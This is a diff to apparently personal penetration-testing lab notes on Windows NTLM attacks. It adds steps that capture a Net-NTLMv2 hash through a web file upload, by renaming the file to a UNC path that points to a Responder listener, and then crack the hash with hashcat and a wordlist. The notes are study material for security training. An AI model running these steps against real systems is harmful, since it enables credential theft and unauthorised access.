@@ -1571,8 +1571,12 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       hashcat --help | grep -i "ntlm" > 1000 | NTLM | Operating System
       hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
       ```
-  - Passing NTLM
-  - Cracking Net-NTLMv2
+  - Passing NTLM (refer note)
+  - Cracking Net-NTLMv2 via web app upload
+    - sudo responder -I tun0  
+    - Burp suite - file upload > change file name > \\\\192.168.45.181\\test > listener captured NTLMv2 hash  
+    - Kali `nano sam.hash`  
+    - `hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt --force` > DISISMYPASSWORD  
   - Relaying Net-NTLMv2
   - Windows credential guard
 - 16.2.1
